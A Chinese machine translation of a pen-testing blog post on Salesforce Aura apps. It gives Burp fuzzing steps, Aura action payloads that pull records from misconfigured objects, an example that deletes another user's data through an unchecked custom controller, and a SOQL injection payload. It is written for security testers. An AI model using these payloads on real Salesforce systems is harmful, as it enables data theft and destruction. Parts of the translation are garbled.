<html>
<head>
<title>Pen-Testing Salesforce Apps: Part 2 (Fuzz &amp; Exploit)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">笔测试Salesforce应用程序:第2部分(模糊和利用)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-2-fuzz-exploit-eefae11ba5ae?source=collection_archive---------0-----------------------#2021-06-17">https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-2-fuzz-exploit-eefae11ba5ae?source=collection_archive---------0-----------------------#2021-06-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="6923" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简而言之:对于笔测试人员和安全研究人员</p><p id="0c13" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一篇关于笔测试Salesforce SAAS应用程序的两部分博客。<a class="ae kl" rel="noopener ugc nofollow" target="_blank" href="/in-simple-words-pen-testing-salesforce-saas-application-part-1-the-essentials-ffae632a00e5">第1部分</a>侧重于理解Salesforce基础知识，第2部分侧重于实际的Pen测试步骤。我们开始吧。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/fa44b4b5da8e0e31cbb14f2f9962b3e3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1004/format:webp/1*TcIvNJ1gvbZmPI6WlEdDyQ.png"/></div></figure><p id="b5d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">工具- </strong>我们将使用Burp术语来识别漏洞并加以利用，这可以通过任何HTTP请求/响应拦截器复制，如OWASP ZAP。</p><h1 id="eb56" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">不当授权-涉及的步骤</h1><ol class=""><li id="34a8" class="ls lt iq jp b jq lu ju lv jy lw kc lx kg ly kk lz ma mb mc bi translated">预检</li><li id="668a" class="ls lt iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">侦察</li><li id="61c6" class="ls lt iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">起毛</li><li id="fe5e" class="ls lt iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">检索敏感信息</li></ol><h1 id="ff94" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">1.预检</h1><p id="676d" class="pw-post-body-paragraph jn jo iq jp b jq lu js jt ju lv jw jx jy mi ka kb kc mj ke kf kg mk ki kj kk ij bi translated">应用程序需要使用一种Salesforce编程技术，如Aura components，以使其容易受到“不当授权”的攻击。因此，让我们首先检查光环是否启用。</p><ul class=""><li id="1447" class="ls lt iq jp b jq jr ju jv jy ml kc mm kg mn kk mo ma mb mc bi translated">通过Burp浏览器浏览应用程序并检查HTTP历史记录，如果这些Aura路径中的一个可见，则可能存在不当授权漏洞。</li></ul><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="899a" class="mu kv iq mq b gy mv mw l mx my"><strong class="mq ir">AURA PATHS:</strong></span><span id="247f" class="mu kv iq mq b gy mz mw l mx my">/s/sfsites/aura<br/>/aura<br/>/sfsites/aura</span></pre><ul class=""><li id="e04d" class="ls lt iq jp b jq jr ju jv jy ml kc mm kg mn kk mo ma mb mc bi translated">如果没有，在Repeater中，通过在主机后立即添加上述路径来发出POST请求，并检查响应，您应该会看到以下模式之一。如果运气不好，也可以通过将这些路径附加到已识别的分支来检查，比如https://redacted.force.com/sales/aura的<a class="ae kl" href="https://redacted.force.com/sales/aura" rel="noopener ugc nofollow" target="_blank">而不是https://redacted.force.com/aura的</a><a class="ae kl" href="https://redacted.force.com/sales/aura" rel="noopener ugc nofollow" target="_blank"/></li></ul><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="7bc7" class="mu kv iq mq b gy mv mw l mx my"><strong class="mq ir">RESPONSE PATTERNS:</strong></span><span id="e481" class="mu kv iq mq b gy mz mw l mx my"><strong class="mq ir">"actions":[<br/></strong>or <br/><strong class="mq ir">aura:clientOutOfSync<br/></strong>or <br/><strong class="mq ir">aura:invalidSession</strong></span></pre><p id="94ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这应该确认Salesforce web应用程序正在使用Aura。</p><h1 id="fb47" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">2.侦察</h1><p id="f21b" class="pw-post-body-paragraph jn jo iq jp b jq lu js jt ju lv jw jx jy mi ka kb kc mj ke kf kg mk ki kj kk ij bi translated">如果你记得在第一部分的结尾，我们的目标是识别对象、控制器、动作和参数，然后模糊它们。让我们来一个一个地识别它们。</p><p id="cbe3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">标准对象</strong> -您可以在下面找到Salesforce提供的标准对象的完整列表。</p><div class="na nb gp gr nc nd"><a href="https://developer.salesforce.com/docs/atlas.en-us.api.meta/api/sforce_api_objects_list.htm" rel="noopener  ugc nofollow" target="_blank"><div class="ne ab fo"><div class="nf ab ng cl cj nh"><h2 class="bd ir gy z fp ni fr fs nj fu fw ip bi translated">标准对象| SOAP API开发者指南| Salesforce开发者</h2><div class="nk l"><h3 class="bd b gy z fp ni fr fs nj fu fw dk translated">构建强大的服务器端解决方案，使用SOAP API集成您的Salesforce数据。选择Web服务…</h3></div><div class="nl l"><p class="bd b dl z fp ni fr fs nj fu fw dk translated">developer.salesforce.com</p></div></div><div class="nm l"><div class="nn l no np nq nm nr ks nd"/></div></div></a></div><p id="59d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在将它们复制到一个文本文件中，我们称之为objects.txt，稍后我们将使用它来模糊请求。</p><p id="bc44" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">自定义对象</strong> -为了区分自定义对象，没有硬性规定，但是Salesforce标准要求您在自定义对象名称的末尾添加一个“<strong class="jp ir"> __c </strong>”。我们可以使用“<strong class="jp ir"> getObjectInfo </strong>”和“<strong class="jp ir"> getHostConfig </strong>”控制器动作来检索定制对象。我们将在模糊部分看到它。一旦你得到它们，就把它添加到objects.txt列表中。</p><p id="754f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">标准控制器和动作</strong> -有几个JS文件作为任何Salesforce web应用程序的一部分被加载，并且包含关于标准控制器、动作以及有时自定义控制器的信息。</p><ol class=""><li id="7d0e" class="ls lt iq jp b jq jr ju jv jy ml kc mm kg mn kk lz ma mb mc bi translated"><strong class="jp ir"> app.js </strong></li><li id="4f95" class="ls lt iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated"><strong class="jp ir"> aura_prod.js </strong></li></ol><p id="0d8f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些JS文件响应中的以下模式。</p><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="e056" class="mu kv iq mq b gy mv mw l mx my"><strong class="mq ir">PATTERN GREP:</strong></span><span id="a0c1" class="mu kv iq mq b gy mz mw l mx my">componentService.initControllerDefs([{</span></pre><p id="479b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所有重要的控制器都会列在这个下面。这是控制器的标准模式。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi ns"><img src="../Images/07104159795f868b500a16fd44c2445d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2mExpLvYrPIWJ-73wdQw4A.png"/></div></div><figcaption class="nx ny gj gh gi nz oa bd b be z dk translated">JS文件中的控制器和动作</figcaption></figure><p id="83f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以将它们复制到文本文件中，或者在需要时使用这些控制器。</p><p id="d78d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">定制控制器和动作- 定制控制器也应该在JS文件中可用，或者有时当您通过Burp浏览器浏览应用程序时，您可能会在HTTP请求中找到它们。你一定很好奇如何区分标准控制器和客户控制器。一种选择是，由于开发了定制控制器，它们的路径可以以“<strong class="jp ir"> apex:// </strong>开始，而不是“<strong class="jp ir"> aura:// </strong></p><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="8d7d" class="mu kv iq mq b gy mv mw l mx my"><strong class="mq ir">STANDARD CONTROLLER:</strong></span><span id="e2c3" class="mu kv iq mq b gy mz mw l mx my"><strong class="mq ir">aura</strong>://RecordUiController/ACTION$getObjectInfo</span><span id="a3a7" class="mu kv iq mq b gy mz mw l mx my"><strong class="mq ir">CUSTOM CONTROLLER:</strong></span><span id="0687" class="mu kv iq mq b gy mz mw l mx my"><strong class="mq ir">apex</strong>://New_Sales_Controller/ACTION$getSalesData</span></pre><h1 id="bf62" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">模糊理解后端权限</h1><p id="bc5b" class="pw-post-body-paragraph jn jo iq jp b jq lu js jt ju lv jw jx jy mi ka kb kc mj ke kf kg mk ki kj kk ij bi translated">我已经创建了一个控制器和动作的列表，你可以帮助你找出某些信息，以及更多的元数据。</p><p id="cd33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">打嗝步骤</strong></p><ol class=""><li id="a284" class="ls lt iq jp b jq jr ju jv jy ml kc mm kg mn kk lz ma mb mc bi translated">将任何带有光环终点的帖子发送到中继器</li><li id="eb08" class="ls lt iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">用以下选项替换请求中的“<strong class="jp ir">消息</strong>”参数。</li><li id="521c" class="ls lt iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">发送给入侵者</li><li id="9cfd" class="ls lt iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">在params (objectApiName，entityNameOrId)中选择<strong class="jp ir"> *** </strong>作为入侵者的位置</li><li id="a1f8" class="ls lt iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">让“有效载荷类型”保持为简单列表</li><li id="cb04" class="ls lt iq jp b jq md ju me jy mf kc mg kg mh kk lz ma mb mc bi translated">上传objects.txt文件或粘贴“有效负载选项”中的对象列表，并尽可能对所有对象运行它</li></ol><p id="0130" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意-你可以模糊他们作为一个客人用户和不同的认证用户来理解权限</p><p id="83da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> getObjectInfo - </strong>了解用户是否有权访问该对象。如果用户没有访问权限，它将不会返回任何信息性响应。如果可以访问，这将返回有关对象及其相应字段的信息。注意每个对象响应中的“__c ”,记下自定义对象。使用objects.txt对入侵者中的所有对象运行此命令。</p><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="36da" class="mu kv iq mq b gy mv mw l mx my">{"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UHNKNOWN","params":{"objectApiName":"***"}}]}</span></pre><p id="2a2f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">返回一个对象列表。请注意“__c”以记录自定义对象。</p><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="1bda" class="mu kv iq mq b gy mv mw l mx my">{"actions":[{"id":"1;a","descriptor":"aura://HostConfigController/ACTION$getConfigData","callingDescriptor":"UHNKNOWN","params":{}}]}</span></pre><p id="bf89" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> getListByObjectName </strong> -返回为UI中的对象创建的列表。使用objects.txt对入侵者中的所有对象运行此命令</p><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="510a" class="mu kv iq mq b gy mv mw l mx my">{"actions":[{"id":"1;a","descriptor":"aura://ListUiController/ACTION$getListsByObjectName","callingDescriptor":"UHNKNOWN","params":{"objectApiName":"***"}}]}</span></pre><p id="fc2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在你必须有足够的关于对象、控制器和它们的元数据的信息。让我们看看如何获得一些实际记录。</p><h1 id="541c" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">检索敏感信息</h1><p id="e0b3" class="pw-post-body-paragraph jn jo iq jp b jq lu js jt ju lv jw jx jy mi ka kb kc mj ke kf kg mk ki kj kk ij bi translated">检索实际的数据或记录与我们检索元数据的方式不会有很大的不同，我们也将使用控制器和动作。为了更好地理解，让我们将权限错误配置映射到利用技术。</p><p id="ad82" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">错误配置1 -扰乱组织。广泛共享默认值和设置广泛共享规则</strong></p><p id="7e86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果管理员通过管理面板破坏了共享权限，那么使用像这样的标准控制器，您应该能够检索记录。</p><p id="d6f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">getItems</strong>——检索与用户对应的给定对象的记录，但是如果记录权限配置错误，这可能会检索整个对象的记录。使用objects.txt对入侵者中的所有对象运行此命令。</p><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="dc36" class="mu kv iq mq b gy mv mw l mx my">{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"***","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}</span></pre><p id="0805" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> getRecord </strong> -根据记录id检索记录。这主要适用于经过身份验证的用户。如果在任何控制器响应中，您找到" id ":，请针对下面的控制器和操作尝试该值。替换下面recordId值中的***符号。</p><p id="a93d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一个Id一般是这样的——“Id”:“0099g 000001 mwqayhu”</p><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="04c0" class="mu kv iq mq b gy mv mw l mx my">{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"***","record":null,"inContextOfComponent":"","mode":"VIEW","layoutType":"FULL","defaultFieldValues":null,"navigationLocation":"LIST_VIEW_ROW"}}]}</span></pre><p id="e51a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">错误配置2——创建定制控制器而不进行适当的清理</strong></p><p id="2eb7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们假设一个开发人员创建了几个自定义控制器来从一个自定义对象<strong class="jp ir">Sales data _ _ c</strong><strong class="jp ir">apex</strong>://New _ Sales _ Controller/ACTION $ getsaledata，这将检索所有用户的销售数据，另一个控制器将删除基于Id <strong class="jp ir"> apex </strong>的销售数据://New _ Sales _ Controller/ACTION $ deletesaldatabyid</p><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="b68e" class="mu kv iq mq b gy mv mw l mx my"><strong class="mq ir">getSalesData</strong></span><span id="ef77" class="mu kv iq mq b gy mz mw l mx my">{"actions":[{"id":"1;a","descriptor":"<strong class="mq ir">apex</strong>://New_Sales_Controller/ACTION$getSalesData","callingDescriptor":"UNKNOWN","params":{}}]}</span><span id="fc97" class="mu kv iq mq b gy mz mw l mx my"><strong class="mq ir">deleteSalesDataById</strong></span><span id="3614" class="mu kv iq mq b gy mz mw l mx my">{"actions":[{"id":"1;a","descriptor":"<strong class="mq ir">apex</strong>://New_Sales_Controller/ACTION$deleteSalesDataById","callingDescriptor":"UNKNOWN","params":{"id":"***"}}]}</span></pre><p id="5f76" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">假设实际权限是这样工作的，所有用户都可以查看getSalesData，而deleteSalesDataById只能用于删除当前用户的销售数据。但是开发人员忽略了清理<strong class="jp ir"> deleteSalesDataById。</strong></p><p id="00d8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行<strong class="jp ir">getsaledata</strong>返回以下响应:</p><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="a149" class="mu kv iq mq b gy mv mw l mx my">{<br/> "actions":[<br/>   {<br/>     "id":"123;a",<br/>     "state":"SUCCESS",<br/>     "returnValue":{<br/>        "result":[<br/>          {<br/>            "record":{<br/>              "Name":"User1",<br/>              "Company Name":"Company1",<br/>              "email":"User1@comapny1.com",<br/>              "Year":"2020",<br/>              "Sales":"5725",<br/>              "Id":"0099g000001mWQsVSK",<br/>          }<br/>        },<br/>        {<br/>            "record":{<br/>              "Name":"User2",<br/>              "Company Name":"Company2",<br/>              "email":"User2@comapny2.com",<br/>              "Year":"2020",<br/>              "Sales":"5725",<br/>              "Id":"0099g000001mWQaYHU",<br/>          }<br/>        }</span></pre><p id="b03b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">假设当前用户是user1，让我们试着删除user2。这可以通过从上面的响应中复制User的“Id”参数并将其粘贴到deleteSalesDataById中来完成</p><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="13eb" class="mu kv iq mq b gy mv mw l mx my"><strong class="mq ir">deleteSalesDataById</strong></span><span id="784d" class="mu kv iq mq b gy mz mw l mx my">{"actions":[{"id":"1;a","descriptor":"<strong class="mq ir">apex</strong>://New_Sales_Controller/ACTION$deleteSalesDataById","callingDescriptor":"UNKNOWN","params":{"id":"0099g000001mWQaYHU"}}]}</span></pre><p id="a66c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于这是一个自定义控制器，并且没有进行适当的消毒检查，因此用户1可以删除用户2的销售数据。</p><p id="d77d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简而言之，找到正确的控制器和动作是检索记录的关键。</p><p id="dcfc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> SOQL注射液</strong></p><p id="9f8e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这与传统的SQL注入非常相似，除了:</p><ul class=""><li id="4365" class="ls lt iq jp b jq jr ju jv jy ml kc mm kg mn kk mo ma mb mc bi translated">SOQL只允许SELECT语句，不允许INSERT、UPDATE或DELETE</li><li id="02e6" class="ls lt iq jp b jq md ju me jy mf kc mg kg mh kk mo ma mb mc bi translated">同样，没有UNION、JOIN操作符或任何命令执行。</li></ul><p id="dbaf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你是否在想，在所有这些限制之后，真的还有什么可以利用的吗？</p><p id="f1ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当然，是的，如果后端代码在没有适当验证的情况下接受用户在查询中的输入，可以修改选择查询来获取更多数据。让我们举一个Salesforce的例子。</p><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="0772" class="mu kv iq mq b gy mv mw l mx my"><strong class="mq ir">USER INPUT<br/></strong>name=bob</span><span id="dddb" class="mu kv iq mq b gy mz mw l mx my"><strong class="mq ir">VULNERABLE QUERY<br/></strong>SELECT Id FROM Contact WHERE (IsDeleted = false and Name like '%Bob%')</span></pre><p id="d9b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">除了用户输入被直接插入到查询中的事实之外，从上面的查询中需要注意的一件重要事情是，SOQL支持使用LIKE的通配符。在这里，将在Contact表中搜索包含单词“bob”的所有内容。现在，让我们注入一个有效载荷。</p><pre class="kn ko kp kq gt mp mq mr ms aw mt bi"><span id="d25b" class="mu kv iq mq b gy mv mw l mx my"><strong class="mq ir">USER INPUT<br/></strong>name: test%') OR (Name LIKE '</span><span id="68e5" class="mu kv iq mq b gy mz mw l mx my"><strong class="mq ir">VULNERABLE QUERY<br/></strong>SELECT Id FROM Contact WHERE (IsDeleted = false AND Name LIKE '%test%') OR (Name LIKE '%')</span></pre><p id="02fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将返回所有联系人。你可能会问，如果我们的最终目标是以“%”结束，为什么我们不能给出单引号。问得好，在SQL注入中，执行一次注入后，你可以用'—'注释掉，对吗？在SOQL中，没有办法添加注释，所以我们需要处理作为原始查询的一部分存在的% '。因此增加了OR，并以单引号结束，正如我们所想的那样。</p><p id="2d1d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望你喜欢阅读博客:)日安！</p><h2 id="a3ae" class="mu kv iq bd kw ob oc dn la od oe dp le jy of og li kc oh oi lm kg oj ok lq ol bi translated">参考</h2><ul class=""><li id="450b" class="ls lt iq jp b jq lu ju lv jy lw kc lx kg ly kk mo ma mb mc bi translated"><a class="ae kl" href="https://help.salesforce.com/articleView?id=sf.review_and_certification.htm&amp;type=5" rel="noopener ugc nofollow" target="_blank">https://help.salesforce.com/articleView?id = SF . review _ and _ certification . htm&amp;type = 5</a></li><li id="1986" class="ls lt iq jp b jq md ju me jy mf kc mg kg mh kk mo ma mb mc bi translated">https://www.enumerated.de/index/salesforce#classes<a class="ae kl" href="https://www.enumerated.de/index/salesforce#classes" rel="noopener ugc nofollow" target="_blank"/></li></ul></div></div>    
</body>
</html>